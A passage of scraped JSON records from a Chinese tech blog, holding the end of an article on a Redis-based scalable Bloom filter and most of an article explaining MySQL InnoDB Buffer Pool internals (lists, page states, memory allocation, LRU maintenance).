id=\"crayon-5a6f39e8bb1d2365138677-23\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">redisBloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mightContain</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">str2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\":\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mightContain</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">str2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1d2365138677-24\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">redisBloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mightContain</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">str3</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\":\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mightContain</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">str3</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1d2365138677-25\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1d2365138677-26\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1d2365138677-27\"><span class=\"crayon-o\">&gt;&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1d2365138677-28\"><span class=\"crayon-e\">grow </span><span class=\"crayon-v\">bloomfilter</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1d2365138677-29\"><span class=\"crayon-t\">false</span><span class=\"crayon-o\">:</span><span class=\"crayon-t\">false</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1d2365138677-30\"><span class=\"crayon-t\">true</span><span class=\"crayon-o\">:</span><span class=\"crayon-t\">true</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1d2365138677-31\"><span class=\"crayon-t\">false</span><span class=\"crayon-o\">:</span><span class=\"crayon-t\">false</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1d2365138677-32\"><span class=\"crayon-o\">&gt;&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1d2365138677-33\"><span class=\"crayon-e\">grow </span><span class=\"crayon-v\">bloomfilter</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1d2365138677-34\"><span class=\"crayon-e\">grow </span><span class=\"crayon-v\">bloomfilter</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">2</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1d2365138677-35\"><span class=\"crayon-e\">grow </span><span class=\"crayon-v\">bloomfilter</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">3</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1d2365138677-36\"><span class=\"crayon-t\">false</span><span class=\"crayon-o\">:</span><span class=\"crayon-t\">false</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1d2365138677-37\"><span class=\"crayon-t\">true</span><span class=\"crayon-o\">:</span><span class=\"crayon-t\">true</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1d2365138677-38\"><span class=\"crayon-t\">false</span><span class=\"crayon-o\">:</span><span class=\"crayon-t\">true</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0068 seconds] -->\r\n<p>综上，本文利用了Guava布隆过滤器的思想，并结合Redis中的Bitmaps等特性实现了支持动态扩容的布隆过滤器，它将布隆过滤器底层的位数据装载到了Redis数据库中，这样的好处在于可以部署在更复杂的多应用或分布式系统中，还可以利用Redis完成持久化，定时过期等功能。</p>\n<p><strong>四、参考文献</strong></p>\n<ol>\n<li>吴军. 数学之美[M]. 人民邮电出版社, 2012.</li>\n<li>Kirsch A, Mitzenmacher M. Less hashing, same performance: building a better bloom filter[C]//ESA. 2006, 6: 456-467.</li>\n<li>Bloom Filters for the Perplexed, https://sagi.io/2017/07/bloom-filters-for-the-perplexed/</li>\n<li>Google Guava, https://github.com/google/guava</li>\n</ol>\n</div>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113396\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113396votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113396\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/2653yy\">fullstackyang</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/2653yy\">\r\n\t\t\t<img src=\"http://tp2.sinaimg.cn/2233098320/180/0/1\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            会当凌绝顶，一览众山小——全栈之路        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/2653yy\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/2653yy/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/2653yy/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 7</a> · <a title=\"我的网站\" target=\"_blank\" href=\"http://www.fullstackyang.com\"><i class=\"fa fa-link\"></i></a> <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/2653yy\"><i class=\"fa fa-weibo\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "2"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2015/11/dea4002e77dd3ecd398568bf746ea46c.png"], "title": "MySQL 引擎特性：InnoDB Buffer Pool", "fav_nums": 1, "url": "http://blog.jobbole.com/113298/", "create_date": "2017/12/13", "url_object_id": "d85a15e01856b264ac4cedfbaff15491", "comment_nums": 0, "front_image_path": "full/75f6595b87bc254afe77bc1151f1aea91fb72f4b.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/coderyuhui/p/6861194.html\">水中的泪</a>   </div><h3 id=\"前言\">前言</h3>\n<p>用户对数据库的最基本要求就是能高效的读取和存储数据，但是读写数据都涉及到与低速的设备交互，为了弥补两者之间的速度差异，所有数据库都有缓存池，用来管理相应的数据页，提高数据库的效率，当然也因为引入了这一中间层，数据库对内存的管理变得相对比较复杂。本文主要分析MySQL Buffer Pool的相关技术以及实现原理，源码基于阿里云RDS MySQL 5.6分支，其中部分特性已经开源到AliSQL。Buffer Pool相关的源代码在buf目录下，主要包括LRU List，Flu List，Double write buffer, 预读预写，Buffer Pool预热，压缩页内存管理等模块，包括头文件和IC文件，一共两万行代码。</p>\n<h3 id=\"基础知识\">基础知识</h3>\n<p><strong><em>Buffer Pool Instance: </em></strong> 大小等于innodb_buffer_pool_size/innodb_buffer_pool_instances，每个instance都有自己的锁，信号量，物理块(Buffer chunks)以及逻辑链表(下面的各种List)，即各个instance之间没有竞争关系，可以并发读取与写入。所有instance的物理块(Buffer chunks)在数据库启动的时候被分配，直到数据库关闭内存才予以释放。当innodb_buffer_pool_size小于1GB时候，innodb_buffer_pool_instances被重置为1，主要是防止有太多小的instance从而导致性能问题。每个Buffer Pool Instance有一个page hash链表，通过它，使用space_id和page_no就能快速找到已经被读入内存的数据页，而不用线性遍历LRU List去查找。注意这个hash表不是InnoDB的自适应哈希，自适应哈希是为了减少Btree的扫描，而page hash是为了避免扫描LRU List。<br>\n<strong><em>数据页：</em></strong> InnoDB中，数据管理的最小单位为页，默认是16KB，页中除了存储用户数据，还可以存储控制信息的数据。InnoDB IO子系统的读写最小单位也是页。如果对表进行了压缩，则对应的数据页称为压缩页，如果需要从压缩页中读取数据，则压缩页需要先解压，形成解压页，解压页为16KB。压缩页的大小是在建表的时候指定，目前支持16K，8K，4K，2K，1K。即使压缩页大小设为16K，在blob/varchar/text的类型中也有一定好处。假设指定的压缩页大小为4K，如果有个数据页无法被压缩到4K以下，则需要做B-tree分裂操作，这是一个比较耗时的操作。正常情况下，Buffer Pool中会把压缩和解压页都缓存起来，当Free List不够时，按照系统当前的实际负载来决定淘汰策略。如果系统瓶颈在IO上，则只驱逐解压页，压缩页依然在Buffer Pool中，否则解压页和压缩页都被驱逐。<br>\n<strong><em>Buffer Chunks: </em></strong> 包括两部分：数据页和数据页对应的控制体，控制体中有指针指向数据页。Buffer Chunks是最低层的物理块，在启动阶段从操作系统申请，直到数据库关闭才释放。通过遍历chunks可以访问几乎所有的数据页，有两种状态的数据页除外：没有被解压的压缩页(BUF_BLOCK_ZIP_PAGE)以及被修改过且解压页已经被驱逐的压缩页(BUF_BLOCK_ZIP_DIRTY)。此外数据页里面不一定都存的是用户数据，开始是控制信息，比如行锁，自适应哈希等。<br>\n<strong><em>逻辑链表: </em></strong> 链表节点是数据页的控制体(控制体中有指针指向真正的数据页)，链表中的所有节点都有同一的属性，引入其的目的是方便管理。下面其中链表都是逻辑链表。<br>\n<strong><em>Free List: </em></strong> 其上的节点都是未被使用的节点，如果需要从数据库中分配新的数据页，直接从上获取即可。InnoDB需要保证Free List有足够的节点，提供给用户线程用，否则需要从FLU List或者LRU List淘汰一定的节点。InnoDB初始化后，Buffer Chunks中的所有数据页都被加入到Free List，表示所有节点都可用。<br>\n<strong><em>LRU List: </em></strong> 这个是InnoDB中最重要的链表。所有新读取进来的数据页都被放在上面。链表按照最近最少使用算法排序，最近最少使用的节点被放在链表末尾，如果Free List里面没有节点了，就会从中淘汰末尾的节点。LRU List还包含没有被解压的压缩页，这些压缩页刚从磁盘读取出来，还没来的及被解压。LRU List被分为两部分，默认前5/8为young list，存储经常被使用的热点page，后3/8为old list。新读入的page默认被加在old list头，只有满足一定条件后，才被移到young list上，主要是为了预读的数据页和全表扫描污染buffer pool。<br>\n<strong><em>FLU List: </em></strong> 这个链表中的所有节点都是脏页，也就是说这些数据页都被修改过，但是还没来得及被刷新到磁盘上。在FLU List上的页面一定在LRU List上，但是反之则不成立。一个数据页可能会在不同的时刻被修改多次，在数据页上记录了最老(也就是第一次)的一次修改的lsn，即oldest_modification。不同数据页有不同的oldest_modification，FLU List中的节点按照oldest_modification排序，链表尾是最小的，也就是最早被修改的数据页，当需要从FLU List中淘汰页面时候，从链表尾部开始淘汰。加入FLU List，需要使用flush_list_mutex保护，所以能保证FLU List中节点的顺序。<br>\n<strong><em>Quick List: </em></strong> 这个链表是阿里云RDS MySQL 5.6加入的，使用带Hint的SQL查询语句，可以把所有这个查询的用到的数据页加入到Quick List中，一旦这个语句结束，就把这个数据页淘汰，主要作用是避免LRU List被全表扫描污染。<br>\n<strong><em>Unzip LRU List: </em></strong> 这个链表中存储的数据页都是解压页，也就是说，这个数据页是从一个压缩页通过解压而来的。<br>\n<strong><em>Zip Clean List: </em></strong> 这个链表只在Debug模式下有，主要是存储没有被解压的压缩页。这些压缩页刚刚从磁盘读取出来，还没来的及被解压，一旦被解压后，就从此链表中删除，然后加入到Unzip LRU List中。<br>\n<strong><em>Zip Free: </em></strong> 压缩页有不同的大小，比如8K，4K，InnoDB使用了类似内存管理的伙伴系统来管理压缩页。Zip Free可以理解为由5个链表构成的一个二维数组，每个链表分别存储了对应大小的内存碎片，例如8K的链表里存储的都是8K的碎片，如果新读入一个8K的页面，首先从这个链表中查找，如果有则直接返回，如果没有则从16K的链表中分裂出两个8K的块，一个被使用，另外一个放入8K链表中。</p>\n<h3 id=\"核心数据结构\">核心数据结构</h3>\n<p>InnoDB Buffer Pool有三种核心的数据结构：buf_pool_t，buf_block_t，buf_page_t。<br>\n<strong><em>but_pool_t: </em></strong> 存储Buffer Pool Instance级别的控制信息，例如整个Buffer Pool Instance的mutex，instance_no, page_hash，old_list_pointer等。还存储了各种逻辑链表的链表根节点。Zip Free这个二维数组也在其中。<br>\n<strong><em>buf_block_t: </em></strong> 这个就是数据页的控制体，用来描述数据页部分的信息(大部分信息在buf_page_t中)。buf_block_t中第一字段就是buf_page_t，这个不是随意放的，是必须放在第一字段，因为只有这样buf_block_t和buf_page_t两种类型的指针可以相互转换。第二个字段是frame字段，指向真正存数据的数据页。buf_block_t还存储了Unzip LRU List链表的根节点。另外一个比较重要的字段就是block级别的mutex。<br>\n<strong><em>buf_page_t: </em></strong> 这个可以理解为另外一个数据页的控制体，大部分的数据页信息存在其中，例如space_id, page_no, page state, newest_modification，oldest_modification，access_time以及压缩页的所有信息等。压缩页的信息包括压缩页的大小，压缩页的数据指针(真正的压缩页数据是存储在由伙伴系统分配的数据页上)。这里需要注意一点，如果某个压缩页被解压了，解压页的数据指针是存储在buf_block_t的frame字段里。</p>\n<p>这里介绍一下buf_page_t中的state字段，这个字段主要用来表示当前页的状态。一共有八种状态。这八种状态对初学者可能比较难理解，尤其是前三种，如果看不懂可以先跳过。<br>\n<strong><em>BUF_BLOCK_POOL_WATCH: </em></strong> 这种类型的page是提供给purge线程用的。InnoDB为了实现多版本，需要把之前的数据记录在undo log中，如果没有读请求再需要它，就可以通过purge线程删除。换句话说，purge线程需要知道某些数据页是否被读取，现在解法就是首先查看page hash，看看这个数据页是否已经被读入，如果没有读入，则获取(启动时候通过malloc分配，不在Buffer Chunks中)一个BUF_BLOCK_POOL_WATCH类型的哨兵数据页控制体，同时加入page_hash但是没有真正的数据(buf_blokc_t::frame为空)并把其类型置为BUF_BLOCK_ZIP_PAGE(表示已经被使用了，其他purge线程就不会用到这个控制体了)，相关函数<code>buf_pool_watch_set</code>，如果查看page hash后发现有这个数据页，只需要判断控制体在内存中的地址是否属于Buffer Chunks即可，如果是表示对应数据页已经被其他线程读入了，相关函数<code>buf_pool_watch_occurred</code>。另一方面，如果用户线程需要这个数据页，先查看page hash看看是否是BUF_BLOCK_POOL_WATCH类型的数据页，如果是则回收这个BUF_BLOCK_POOL_WATCH类型的数据页，从Free List中(即在Buffer Chunks中)分配一个空闲的控制体，填入数据。这里的核心思想就是通过控制体在内存中的地址来确定数据页是否还在被使用。<br>\n<strong><em>BUF_BLOCK_ZIP_PAGE: </em></strong>当压缩页从磁盘读取出来的时候，先通过malloc分配一个临时的buf_page_t，然后从伙伴系统中分配出压缩页存储的空间，把磁盘中读取的压缩数据存入，然后把这个临时的buf_page_t标记为BUF_BLOCK_ZIP_PAGE状态(<code>buf_page_init_for_read</code>)，只有当这个压缩页被解压了，state字段才会被修改为BUF_BLOCK_FILE_PAGE，并加入LRU List和Unzip LRU List(<code>buf_page_get_gen</code>)。如果一个压缩页对应的解压页被驱逐了，但是需要保留这个压缩页且压缩页不是脏页，则这个压缩页被标记为BUF_BLOCK_ZIP_PAGE(<code>buf_LRU_free_page</code>)。所以正常情况下，处于BUF_BLOCK_ZIP_PAGE状态的不会很多。前述两种被标记为BUF_BLOCK_ZIP_PAGE的压缩页都在LRU List中。另外一个用法是，从BUF_BLOCK_POOL_WATCH类型节点中，如果被某个purge线程使用了，也会被标记为BUF_BLOCK_ZIP_PAGE。<br>\n<strong><em>BUF_BLOCK_ZIP_DIRTY: </em></strong> 如果一个压缩页对应的解压页被驱逐了，但是需要保留这个压缩页且压缩页是脏页，则被标记为BUF_BLOCK_ZIP_DIRTY(<code>buf_LRU_free_page</code>)，如果该压缩页又被解压了，则状态会变为BUF_BLOCK_FILE_PAGE。因此BUF_BLOCK_ZIP_DIRTY也是一个比较短暂的状态。这种类型的数据页都在Flush List中。<br>\n<strong><em>BUF_BLOCK_NOT_USED: </em></strong> 当链表处于Free List中，状态就为此状态。是一个能长期存在的状态。<br>\n<strong><em>BUF_BLOCK_READY_FOR_USE: </em></strong> 当从Free List中，获取一个空闲的数据页时，状态会从BUF_BLOCK_NOT_USED变为BUF_BLOCK_READY_FOR_USE(<code>buf_LRU_get_free_block</code>)，也是一个比较短暂的状态。处于这个状态的数据页不处于任何逻辑链表中。<br>\n<strong><em>BUF_BLOCK_FILE_PAGE: </em></strong> 正常被使用的数据页都是这种状态。LRU List中，大部分数据页都是这种状态。压缩页被解压后，状态也会变成BUF_BLOCK_FILE_PAGE。<br>\n<strong><em>BUF_BLOCK_MEMORY: </em></strong> Buffer Pool中的数据页不仅可以存储用户数据，也可以存储一些系统信息，例如InnoDB行锁，自适应哈希索引以及压缩页的数据等，这些数据页被标记为BUF_BLOCK_MEMORY。处于这个状态的数据页不处于任何逻辑链表中<br>\n<strong><em>BUF_BLOCK_REMOVE_HASH: </em></strong> 当加入Free List之前，需要先把page hash移除。因此这种状态就表示此页面page hash已经被移除，但是还没被加入到Free List中，是一个比较短暂的状态。<br>\n总体来说，大部分数据页都处于BUF_BLOCK_NOT_USED(全部在Free List中)和BUF_BLOCK_FILE_PAGE(大部分处于LRU List中，LRU List中还包含除被purge线程标记的BUF_BLOCK_ZIP_PAGE状态的数据页)状态，少部分处于BUF_BLOCK_MEMORY状态，极少处于其他状态。前三种状态的数据页都不在Buffer Chunks上，对应的控制体都是临时分配的，InnoDB把他们列为invalid state(<code>buf_block_state_valid</code>)。<br>\n如果理解了这八种状态以及其之间的转换关系，那么阅读Buffer pool的代码细节就会更加游刃有余。</p>\n<p>接下来，简单介绍一下buf_page_t中buf_fix_count和io_fix两个变量，这两个变量主要用来做并发控制，减少mutex加锁的范围。当从buffer pool读取一个数据页时候，会其加读锁，然后递增buf_page_t::buf_fix_count，同时设置buf_page_t::io_fix为BUF_IO_READ，然后即可以释放读锁。后续如果其他线程在驱逐数据页(或者刷脏)的时候，需要先检查一下这两个变量，如果buf_page_t::buf_fix_count不为零且buf_page_t::io_fix不为BUF_IO_NONE，则不允许驱逐(<code>buf_page_can_relocate</code>)。这里的技巧主要是为了减少数据页控制体上mutex的争抢，而对数据页的内容，读取的时候依然要加读锁，修改时加写锁。</p>\n<h3 id=\"buffer-pool内存初始化\">Buffer Pool内存初始化</h3>\n<p>Buffer Pool的内存初始化，主要是Buffer Chunks的内存初始化，buffer pool instance一个一个轮流初始化。核心函数为<code>buf_chunk_init</code>和<code>os_mem_alloc_large</code><br>\n。阅读代码可以发现，目前从操作系统分配内存有两种方式，一种是通过HugeTLB的方式来分配，另外一种使用传统的mmap来分配。<br>\n<strong><em>HugeTLB: </em></strong> 这是一种大内存块的分配管理技术。类似数据库对数据的管理，内存也按照页来管理，默认的页大小为4KB，HugeTLB就是把页大小提高到2M或者更加多。程序传送给cpu都是虚拟内存地址，cpu必须通过快表来映射到真正的物理内存地址。快表的全集放在内存中，部分热点内存页可以放在cpu cache中，从而提高内存访问效率。假设cpu cache为100KB，每条快表占用1KB，页大小为4KB，则热点内存页为100KB/1KB=100条，覆盖100<em>4KB=400KB的内存数据，但是如果也默认页大小为2M，则同样大小的cpu cache，可以覆盖100</em>2M=200MB的内存数据，也就是说，访问200MB的数据只需要一次读取内存即可(如果映射关系没有在cache中找到，则需要先把映射关系从内存中读到cache，然后查找，最后再去读内存中需要的数据，会造成两次访问物理内存)。也就是说，使用HugeTLB这种大内存技术，可以提高快表的命中率，从而提高访问内存的性能。当然这个技术也不是银弹，内存页变大了也必定会导致更多的页内的碎片。如果需要从swap分区中加载虚拟内存，也会变慢。当然最终要的理由是，4KB大小的内存页已经被业界稳定使用很多年了，如果没有特殊的需求不需要冒这个风险。在InnoDB中，如果需要用到这项技术可以使用super-large-pages参数启动MySQL。<br>\n<strong><em>mmap分配：</em></strong> 在Linux下，多个进程需要共享一片内存，可以使用mmap来分配和绑定，所以只提供给一个MySQL进程使用也是可以的。用mmap分配的内存都是虚存，在top命令中占用VIRT这一列，而不是RES这一列，只有相应的内存被真正使用到了，才会被统计到RES中，提高内存使用率。这样是为什么常常看到MySQL一启动就被分配了很多的VIRT，而RES却是慢慢涨上来的原因。这里大家可能有个疑问，为啥不用malloc。其实查阅malloc文档，可以发现，当请求的内存数量大于MMAP_THRESHOLD(默认为128KB)时候，malloc底层就是调用了mmap。在InnoDB中，默认使用mmap来分配。<br>\n分配完了内存，<code>buf_chunk_init</code>函数中，把这片内存划分为两个部分，前一部分是数据页控制体(buf_block_t)，在阿里云RDS MySQL 5.6 release版本中，每个buf_block_t是424字节，一共有innodb_buffer_pool_size/UNIV_PAGE_SIZE个。后一部分是真正的数据页，按照UNIV_PAGE_SIZE分隔。假设page大小为16KB，则数据页控制体占的内存:数据页约等于1:38.6，也就是说如果innodb_buffer_pool_size被配置为40G，则需要额外的1G多空间来存数据页的控制体。<br>\n划分完空间后，遍历数据页控制体，设置buf_block_t::frame指针，指向真正的数据页，然后把这些数据页加入到Free List中即可。初始化完Buffer Chunks的内存，还需要初始化BUF_BLOCK_POOL_WATCH类型的数据页控制块，page hash的结构体，zip hash的结构体(所有被压缩页的伙伴系统分配走的数据页面会加入到这个哈希表中)。注意这些内存是额外分配的，不包含在Buffer Chunks中。<br>\n除了<code>buf_pool_init</code>外，建议读者参考一下<code>but_pool_free</code>这个内存释放函数，加深对Buffer Pool相关内存的理解。</p>\n<h3 id=\"buf_page_get函数解析\">Buf_page_get函数解析</h3>\n<p>这个函数极其重要，是其他模块获取数据页的外部接口函数。如果请求的数据页已经在Buffer Pool中了，修改相应信息后，就直接返回对应数据页指针，如果Buffer Pool中没有相关数据页，则从磁盘中读取。<code>Buf_page_get</code>是一个宏定义，真正的函数为<code>buf_page_get_gen</code>，参数主要为space_id, page_no, lock_type, mode以及mtr。这里主要介绍一个mode这个参数，其表示读取的方式，目前支持六种，前三种用的比较多。<br>\n<strong><em>BUF_GET: </em></strong> 默认获取数据页的方式，如果数据页不在Buffer Pool中，则从磁盘读取，如果已经在Buffer Pool中，需要判断是否要把他加入到young list中以及判断是否需要进行线性预读。如果是读取则加读锁，修改则加写锁。<br>\n<strong><em>BUF_GET_IF_IN_POOL: </em></strong> 只在Buffer Pool中查找这个数据页，如果在则判断是否要把它加入到young list中以及判断是否需要进行线性预读。如果不在则直接返回空。加锁方式与BUF_GET类似。<br>\n<strong><em>BUF_PEEK_IF_IN_POOL: </em></strong> 与BUF_GET_IF_IN_POOL类似，只是即使条件满足也不把它加入到young list中也不进行线性预读。加锁方式与BUF_GET类似。<br>\n<strong><em>BUF_GET_NO_LATCH: </em></strong> 不管对数据页是读取还是修改，都不加锁。其他方面与BUF_GET类似。<br>\n<strong><em>BUF_GET_IF_IN_POOL_OR_WATCH: </em></strong> 只在Buffer Pool中查找这个数据页，如果在则判断是否要把它加入到young list中以及判断是否需要进行线性预读。如果不在则设置watch。加锁方式与BUF_GET类似。这个是要是给purge线程用。<br>\n<strong><em>BUF_GET_POSSIBLY_FREED: </em></strong> 这个mode与BUF_GET类似，只是允许相应的数据页在函数执行过程中被释放，主要用在估算Btree两个slot之前的数据行数。<br>\n接下来，我们简要分析一下这个函数的主要逻辑。</p>\n<ul>\n<li>首先通过<code>buf_pool_get</code>函数依据space_id和page_no查找指定的数据页在那个Buffer Pool Instance里面。算法很简单<code>instance_no = (space_id &lt;&lt; 20 + space_id + page_no &gt;&gt; 6) % instance_num</code>，也就是说先通过space_id和page_no算出一个fold value然后按照instance的个数取余数即可。这里有个小细节，page_no的第六位被砍掉，这是为了保证一个extent的数据能被缓存到同一个Buffer Pool Instance中，便于后面的预读操作。</li>\n<li>接着，调用<code>buf_page_hash_get_low</code>函数在page hash中查找这个数据页是否已经被加载到对应的Buffer Pool Instance中，如果没有找到这个数据页且mode为BUF_GET_IF_IN_POOL_OR_WATCH则设置watch数据页(<code>buf_pool_watch_set</code>)，接下来，如果没有找到数据页且mode为BUF_GET_IF_IN_POOL、BUF_PEEK_IF_IN_POOL或者BUF_GET_IF_IN_POOL_OR_WATCH函数直接返回空，表示没有找到数据页。如果没有找到数据但是mode为其他，就从磁盘中同步读取(<code>buf_read_page</code>)。在读取磁盘数据之前，我们如果发现需要读取的是非压缩页，则先从Free List中获取空闲的数据页，如果Free List中已经没有了，则需要通过刷脏来释放数据页，这里的一些细节我们后续在LRU模块再分析，获取到空闲的数据页后，加入到LRU List中(<code>buf_page_init_for_read</code>)。在读取磁盘数据之前，我们如果发现需要读取的是压缩页，则临时分配一个buf_page_t用来做控制体，通过伙伴系统分配到压缩页存数据的空间，最后同样加入到LRU List中(<code>buf_page_init_for_read</code>)。做完这些后，我们就调用IO子系统的接口同步读取页面数据，如果读取数据失败，我们重试100次(<code>BUF_PAGE_READ_MAX_RETRIES</code>)然后触发断言，如果成功则判断是否要进行随机预读(随机预读相关的细节我们也在预读预写模块分析)。</li>\n<li>接着，读取数据成功后，我们需要判断读取的数据页是不是压缩页，如果是的话，因为从磁盘中读取的压缩页的控制体是临时分配的，所以需要重新分配block(<code>buf_LRU_get_free_block</code>)，把临时分配的buf_page_t给释放掉，用<code>buf_relocate</code>函数替换掉，接着进行解压，解压成功后，设置state为BUF_BLOCK_FILE_PAGE，最后加入Unzip LRU List中。</li>\n<li>接着，我们判断这个页是否是第一次访问，如果是则设置buf_page_t::access_time，如果不是，我们则判断其是不是在Quick List中，如果在Quick List中且当前事务不是加过Hint语句的事务，则需要把这个数据页从Quick List删除，因为这个页面被其他的语句访问到了，不应该在Quick List中了。</li>\n<li>接着，如果mode不为BUF_PEEK_IF_IN_POOL，我们需要判断是否把这个数据页移到young list中，具体细节在后面LRU模块中分析。</li>\n<li>接着，如果mode不为BUF_GET_NO_LATCH，我们给数据页加上读写锁。</li>\n<li>最后，如果mode不为BUF_PEEK_IF_IN_POOL且这个数据页是第一次访问，则判断是否需要进行线性预读(线性预读相关的细节我们也在预读预写模块分析)。</li>\n</ul>\n<h3 id=\"lru-list中young-list和old-list的维护\">LRU List中young list和old list的维护</h3>\n<p>当LRU List链表大于512(<code>BUF_LRU_OLD_MIN_LEN</code>)时，在逻辑上被分为两部分，前面部分存储最热的数据页，这部分链表称作young list，后面部分则存储冷数据页，这部分称作old list，一旦Free List中没有页面了，就会从冷页面中驱逐。两部分的长度由参数innodb_old_blocks_pct控制。每次加入或者驱逐一个数据页后，都要调整young list和old list的长度(<code>buf_LRU_old_adjust_len</code>)，同时引入<code>BUF_LRU_OLD_TOLERANCE</code>来防止链表调整过频繁。当LRU List链表小于512，则只有old list。<br>\n新读取进来的页面默认被放在old list头，在经过innodb_old_blocks_time后，如果再次被访问了，就挪到young list头上。一个数据页被读入Buffer Pool后，在小于innodb_old_blocks_time的时间内被访问了很多次，之后就不再被访问了，这样的数据页也很快被驱逐。这个设计认为这种数据页是不健康的，应该被驱逐。<br>\n此外，如果一个数据页已经处于young list，当它再次被访问的时候，不会无条件的移动到young list头上，只有当其处于young list长度的1/4(大约值)之后，才会被移动到young list头部，这样做的目的是减少对LRU List的修改，否则每访问一个数据页就要修改链表一次，效率会很低，因为LRU List的根本目的是保证经常被访问的数据页不会被驱逐出去，因此只需要保证这些热点数据页在头部一个可控的范围内即可。相关逻辑可以参考函数<code>buf_page_peek_if_too_old</code>。</p>\n<h3 